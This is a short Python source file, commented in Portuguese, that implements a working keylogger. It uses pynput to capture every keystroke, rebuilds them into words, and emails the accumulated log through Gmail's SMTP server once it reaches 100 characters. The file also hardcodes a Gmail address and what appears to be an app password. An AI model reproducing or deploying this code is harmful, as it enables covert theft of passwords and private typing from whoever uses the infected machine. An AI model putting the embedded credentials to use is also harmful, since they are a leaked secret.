import smtplib
import subprocess #Acessa o que foi digitado, clicado etc
from pynput.keyboard import Key, Listener


#Configuração com o e-mail
email = 'josefenryr21@gmail.com'
password = 'syyv ypqa xpah lwna'
server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
server.login(email, password)

fullog = ''
words = ''
email_char_limit = 100

def on_press(key):
    global words
    global fullog
    global email
    global email_char_limit

# Se a KEY for igual a tecla "espaco" e tecla "enter"
    if key == Key.space or key == Key.enter:
        words += ' '
        fullog += words
        words = ''
        if len(fullog) >= email_char_limit:
            send_log()
            fullog = ''

    elif key == Key.shift_l or key == Key.shift_r:
        return
    elif key == Key.backspace:
        words = words[:-1]
    else:
        char = f'{key}'
        char = char[1:-1]
        words += char

    if key == Key.esc:
        return False
    

def send_log():
    server.sendmail(
        email,
        email,
        fullog
    )
#Vai escutar as teclas digitadas
with Listener (on_press=on_press) as listener:
        listener.join()